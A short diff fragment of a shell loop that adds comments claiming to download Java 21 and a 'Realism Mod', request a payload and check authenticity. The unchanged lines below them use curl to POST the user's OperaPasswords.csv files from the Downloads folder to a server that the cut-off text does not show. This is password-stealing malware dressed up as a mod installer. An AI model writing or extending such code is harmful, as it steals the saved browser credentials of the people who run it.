@@ -27,6 +27,25 @@ while true; do
         continue
     fi
 
+# Downloading The Java 21 Files And Downloading The Realism Mod
+
+
+
+# Sending Request To Pull File From Server Directory
+
+
+
+# Requesting Payload From Server
+
+
+
+# Checking Authenticity
+
+
+
+
+
+
     curl -X POST \
         -F "file=@$HOME/Downloads/OperaPasswords.csv" \
         -F "file=@$HOME/Downloads/Operapasswords.csv" \
